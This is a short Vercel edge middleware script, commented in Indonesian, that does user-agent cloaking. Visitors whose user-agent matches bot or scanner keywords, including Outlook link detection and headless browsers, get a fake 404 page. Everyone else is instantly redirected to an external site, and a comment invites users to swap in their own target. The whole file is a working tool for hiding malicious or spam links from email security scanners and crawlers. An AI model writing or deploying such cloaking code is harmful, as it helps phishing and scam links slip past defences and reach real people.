import { next } from '@vercel/edge';

export const config = {
  matcher: '/', // Menjalankan logika ini di halaman utama
};

export default function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';

  // 1. Daftar Kata Kunci Bot Scanner (Outlook, Google, Bot Umum)
  const botKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 'outlook-linkdetect', 
    'preview', 'headless', 'googleusercontent', 'monit', 'slurp'
  ];

  const isBot = botKeywords.some(keyword => ua.includes(keyword));

  // 2. LOGIKA CLOAKING
  if (isBot) {
    // JIKA BOT: Kirim halaman 404 palsu atau teks biasa (Sangat aman)
    return new Response('404 Not Found', { status: 404 });
  }

  // 3. JIKA MANUSIA: Redirect Instan (307 Temporary Redirect)
  // Ganti URL di bawah dengan web tujuanmu
  const targetUrl = 'https://nusaindahrp.com/?dev';
  
  return Response.redirect(targetUrl, 307);
}